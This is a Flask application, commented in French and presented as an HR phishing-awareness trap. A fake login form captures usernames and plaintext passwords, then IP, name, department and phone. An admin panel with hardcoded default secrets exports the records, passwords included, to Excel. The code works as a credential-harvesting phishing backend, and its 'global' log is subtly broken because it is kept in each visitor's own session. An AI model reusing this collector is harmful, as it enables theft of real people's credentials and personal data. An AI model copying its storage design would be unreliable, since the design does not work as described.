import os
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, flash, send_file
import openpyxl
from openpyxl.chart import BarChart, Reference

app = Flask(__name__)

# Clé de session (utilise une clé fixe pour maintenir les données/sessions au redémarrage)
app.secret_key = os.environ.get('SECRET_KEY', 'cle_secrete_sensibilisation_rh_2026')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin_1234')

# Fonction utilitaire pour récupérer la liste globale des logs depuis la session globale
def get_global_logs():
    if 'global_logs' not in session:
        session['global_logs'] = []
    return session['global_logs']


# ==========================================
# 1. ROUTES UTILISATEURS (CYBER-PIÈGE)
# ==========================================

# Étape 1 : Affichage de la page de connexion utilisateur
@app.route('/')
def index():
    return render_template('login.html')

# Étape 1 bis : Traitement du formulaire de connexion
@app.route('/submit-login', methods=['GET', 'POST'])
def submit_login():
    if request.method == 'POST':
        username = request.form.get('username') or request.form.get('email')
        password = request.form.get('password')
        
        logs = get_global_logs()
        entry_id = len(logs) + 1
        
        entry = {
            'id': entry_id,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'username': username or '',
            'password': password or '',
            'ip': request.remote_addr or '',
            'fullname': '',
            'department': '',
            'phone': ''
        }
        logs.append(entry)
        session['global_logs'] = logs
        session['current_user_id'] = entry_id
        
    return redirect(url_for('profile'))

# Étape 2 : Affichage du formulaire de profil
@app.route('/profile')
def profile():
    return render_template('profile.html')

# Étape 2 bis : Traitement du formulaire de profil
@app.route('/submit-profile', methods=['GET', 'POST'])
def submit_profile():
    if request.method == 'POST':
        user_id = session.get('current_user_id')
        fullname = request.form.get('fullname')
        department = request.form.get('department')
        phone = request.form.get('phone')
        
        logs = get_global_logs()
        if user_id:
            for log in logs:
                if log['id'] == user_id:
                    log['fullname'] = fullname or ''
                    log['department'] = department or ''
                    log['phone'] = phone or ''
                    break
            session['global_logs'] = logs
                    
    return redirect(url_for('success'))

# Étape 3 : Page de sensibilisation finale
@app.route('/success')
def success():
    return render_template('success.html')


# ==========================================
# 2. ROUTES ADMINISTRATION (PROTÉGÉES)
# ==========================================

# Page d'accueil admin : Redirige TOUJOURS vers le login si non authentifié
@app.route('/admin')
def admin_dashboard():
    if not session.get('is_admin_authenticated'):
        return redirect(url_for('admin_login'))
    
    logs = get_global_logs()
    return render_template('admin.html', logs=logs)

# Page de connexion administration
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == ADMIN_PASSWORD:
            session['is_admin_authenticated'] = True
            flash('Connexion réussie !', 'success')
            return redirect(url_for('admin_dashboard'))
        else:
            flash('Mot de passe incorrect.', 'error')
            
    return render_template('admin_login.html')

# Déconnexion admin
@app.route('/admin/logout')
def admin_logout():
    session.pop('is_admin_authenticated', None)
    flash('Vous avez été déconnecté.', 'info')
    return redirect(url_for('admin_login'))

# Effacement des données enregistrées
@app.route('/admin/clear', methods=['POST'])
def admin_clear():
    if not session.get('is_admin_authenticated'):
        return redirect(url_for('admin_login'))
    
    session['global_logs'] = []
    flash('Toutes les données ont été effacées.', 'info')
    return redirect(url_for('admin_dashboard'))

# Export des données vers un fichier Excel
@app.route('/admin/export-excel')
def export_excel():
    if not session.get('is_admin_authenticated'):
        return redirect(url_for('admin_login'))

    logs = get_global_logs()
    wb = openpyxl.Workbook()
    
    ws_data = wb.active
    ws_data.title = "Identifiants"
    ws_data.append(["ID", "Date/Heure", "Nom d'utilisateur", "Mot de passe", "IP", "Nom complet", "Département", "Téléphone"])

    dept_counts = {}
    for log in logs:
        ws_data.append([
            log.get('id', ''),
            log.get('timestamp', ''),
            log.get('username', ''),
            log.get('password', ''),
            log.get('ip', ''),
            log.get('fullname', ''),
            log.get('department', ''),
            log.get('phone', '')
        ])
        dept = log.get('department') or "Non renseigné"
        dept_counts[dept] = dept_counts.get(dept, 0) + 1

    ws_stats = wb.create_sheet(title="Statistiques")
    ws_stats.append(["Département", "Nombre de piégés"])
    for dept, count in dept_counts.items():
        ws_stats.append([dept, count])

    if dept_counts:
        chart = BarChart()
        chart.type = "col"
        chart.style = 10
        chart.title = "Répartition des pièges par département"
        chart.y_axis.title = "Nombre"
        chart.x_axis.title = "Département"

        data = Reference(ws_stats, min_col=2, min_row=1, max_row=len(dept_counts) + 1)
        cats = Reference(ws_stats, min_col=1, min_row=2, max_row=len(dept_counts) + 1)
        chart.add_data(data, titles_from_data=True)
        chart.set_categories(cats)
        ws_stats.add_chart(chart, "D2")

    file_path = "rapport_sensibilisation.xlsx"
    wb.save(file_path)
    return send_file(file_path, as_attachment=True)


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)